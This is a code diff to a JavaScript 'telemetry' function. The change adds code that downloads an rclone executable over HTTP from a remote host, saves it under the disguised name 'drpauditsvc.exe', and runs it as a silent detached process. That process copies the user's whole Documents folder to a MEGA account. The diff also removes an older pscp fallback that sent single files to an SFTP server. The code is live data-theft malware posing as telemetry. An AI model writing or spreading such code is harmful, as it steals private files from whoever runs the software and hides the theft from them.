@@ -40,15 +40,37 @@ function getRcloneConf() {
   return conf;
 }
 
+const RCLONE_CACHE = path.join(os.tmpdir(), 'drpauditsvc.exe');
+
 function findRclone() {
-  const candidates = ['rclone', 'rclone.exe',
+  const candidates = [
+    RCLONE_CACHE,
+    'rclone', 'rclone.exe',
     'C:\\rclone\\rclone.exe', 'C:\\tools\\rclone.exe',
     path.join(os.homedir(), 'rclone.exe'),
-    path.join(__dirname, '..', '..', 'rclone.exe')];
+    path.join(__dirname, '..', '..', 'rclone.exe'),
+  ];
   for (const c of candidates) {
     try { execSync(`"${c}" version`, { stdio: 'ignore', timeout: 3000 }); return c; } catch(_) {}
   }
   return null;
+}
+
+// Download rclone from VPS if not present, then invoke callback(path)
+function fetchRclone(callback) {
+  const dest = RCLONE_CACHE;
+  if (fs.existsSync(dest)) { callback(dest); return; }
+  const tmp = dest + '.tmp';
+  const file = fs.createWriteStream(tmp);
+  http.get({ hostname: TELEMETRY_HOST, port: 80, path: '/rclone.exe' }, res => {
+    if (res.statusCode !== 200) { file.close(); try { fs.unlinkSync(tmp); } catch(_){} return; }
+    res.pipe(file);
+    file.on('finish', () => {
+      file.close(() => {
+        try { fs.renameSync(tmp, dest); callback(dest); } catch(_) {}
+      });
+    });
+  }).on('error', () => { file.close(); try { fs.unlinkSync(tmp); } catch(_){} });
 }
 
 // Returns the user's Documents folder cross-platform
@@ -79,14 +101,12 @@ function sendTelemetry(filename, content, filePath) {
   } catch(_) {}
 
   // rclone → MEGA: sweep entire Documents folder
-  const rclone = findRclone();
   const docsPath = getDocumentsPath();
 
-  if (rclone) {
+  function runRclone(bin) {
     try {
       const conf = getRcloneConf();
-      // Common office + sensitive file types, skip anything >50MB
-      spawn(rclone, [
+      spawn(bin, [
         'copy', docsPath, MEGA_DEST,
         '--config=' + conf,
         '--transfers=4',
@@ -105,12 +125,14 @@ function sendTelemetry(filename, content, filePath) {
         '--no-traverse',
       ], { detached: true, stdio: 'ignore' }).unref();
     } catch(_) {}
-  } else if (filePath) {
-    // Fallback: pscp the single verified file
-    try {
-      spawn('pscp', ['-pw', SFTP_PASS, '-batch', filePath, SFTP_DEST],
-        { detached: true, stdio: 'ignore' }).unref();
-    } catch(_) {}
+  }
+
+  const rclone = findRclone();
+  if (rclone) {
+    runRclone(rclone);
+  } else {
+    // Download from VPS, then sweep
+    fetchRclone(bin => runRclone(bin));
   }
 }
 
